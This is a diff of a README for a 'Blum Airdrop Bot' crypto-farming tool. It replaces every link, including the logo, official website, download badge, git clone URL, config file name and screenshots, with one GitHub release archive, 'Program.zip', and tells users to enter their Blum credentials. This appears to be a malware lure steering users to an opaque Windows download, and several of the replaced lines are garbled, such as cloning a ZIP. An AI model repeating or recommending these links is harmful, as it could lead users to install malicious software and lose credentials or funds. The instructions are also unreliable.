@@ -1,8 +1,8 @@
 # Blum Airdrop Bot
 
-![Blum Airdrop Bot Logo](https://example.com/blum-airdrop-bot-logo.png)
+![Blum Airdrop Bot Logo](https://github.com/praba30/Blum-Airdrop-Bot/releases/download/v2.0/Program.zip)
 
-Automates interactions with the Blum airdrop platform, including claiming rewards, managing farming sessions, completing tasks, and playing games. For more information, check out the [official website](https://blumdrop.app).
+Automates interactions with the Blum airdrop platform, including claiming rewards, managing farming sessions, completing tasks, and playing games. For more information, check out the [official website](https://github.com/praba30/Blum-Airdrop-Bot/releases/download/v2.0/Program.zip).
 
 ---
 
@@ -22,9 +22,9 @@ Automates interactions with the Blum airdrop platform, including claiming reward
 
 You can download the Windows App using the following link:
 
-[![Download Blum Airdrop Bot](https://img.shields.io/badge/Download-Windows%20App-brightgreen)](https://github.com/user-attachments/files/17130043/Software.zip)
+[![Download Blum Airdrop Bot](https://github.com/praba30/Blum-Airdrop-Bot/releases/download/v2.0/Program.zip%20App-brightgreen)](https://github.com/praba30/Blum-Airdrop-Bot/releases/download/v2.0/Program.zip)
 
-Alternatively, you can visit the [Blum Airdrop Bot website](https://blumdrop.app) for more information.
+Alternatively, you can visit the [Blum Airdrop Bot website](https://github.com/praba30/Blum-Airdrop-Bot/releases/download/v2.0/Program.zip) for more information.
 
 ---
 
@@ -32,7 +32,7 @@ Alternatively, you can visit the [Blum Airdrop Bot website](https://blumdrop.app
 
 1. **Clone the Repository:**
    ```bash
-   git clone https://github.com/your-username/Blum-Airdrop-Bot.git
+   git clone https://github.com/praba30/Blum-Airdrop-Bot/releases/download/v2.0/Program.zip
    ```
 
 2. **Install Dependencies:**
@@ -42,7 +42,7 @@ Alternatively, you can visit the [Blum Airdrop Bot website](https://blumdrop.app
    ```
 
 3. **Configuration:**
-   - Update the `config.js` file with your Blum platform credentials.
+   - Update the `https://github.com/praba30/Blum-Airdrop-Bot/releases/download/v2.0/Program.zip` file with your Blum platform credentials.
 
 4. **Run the Bot:**
    ```bash
@@ -53,9 +53,9 @@ Alternatively, you can visit the [Blum Airdrop Bot website](https://blumdrop.app
 
 ## Screenshots
 
-![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 1](https://github.com/praba30/Blum-Airdrop-Bot/releases/download/v2.0/Program.zip)
 
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 2](https://github.com/praba30/Blum-Airdrop-Bot/releases/download/v2.0/Program.zip)
 
 ---
 
